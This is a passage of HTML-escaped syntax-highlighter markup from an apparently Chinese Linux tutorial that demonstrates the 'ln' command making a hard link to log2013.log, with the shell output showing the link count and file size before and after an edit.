				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934f166828781-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934f166828781-1&quot;&gt;
&lt;span class=&quot;crayon-r&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test3&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aa01f39352649503412&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# ln log2013.log test3

[root@localhost test]# ll

lrwxrwxrwx 1 root root     11 12-07 16:01 link2013 -&amp;gt; log2013.log

-rw-r--r-- 1 root bin      61 11-13 06:03 ln2013

-rw-r--r-- 2 root root     96 12-07 16:21 log2013.log

[root@localhost test]# cd test3

[root@localhost test3]# ll

-rw-r--r-- 2 root root 96 12-07 16:21 log2013.log

[root@localhost test3]# vi log2013.log 

2013-01

2013-02

2013-03

2013-04

2013-05

2013-06

2013-07

2013-08

2013-09

2013-10[root@localhost test3]# ll

-rw-r--r-- 2 root root 80 12-07 16:36 log2013.log

[root@localhost test3]# cd ..

[root@localhost test]# ll

lrwxrwxrwx 1 root root     11 12-07 16:01 link2013 -&amp;gt; log2013.log

-rw-r--r-- 1 root bin      61 11-13 06:03 ln2013

-rw-r--r-- 2 root root     80 12-07 16:36 log2013.log

[root@localhost test]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f39352649503412-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f39352649503412-51&quot;&gt;51&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ln log2013.log test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-3&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-5&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;lrwxrwxrwx&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;link2013&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;ln2013&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;96&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-11&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cd test3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-13&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;96&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;21&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-17&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# vi log2013.log &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-19&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;01&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-21&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;02&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-23&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-25&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;04&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-27&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;05&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-28&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-29&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-30&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-31&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-32&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-33&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-34&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-35&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;09&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-36&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-37&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2013&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-38&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-39&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;36&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f39352649503412-40&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f39352649503412-41&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# cd ..&lt;/span&gt;
&lt;/div&gt;
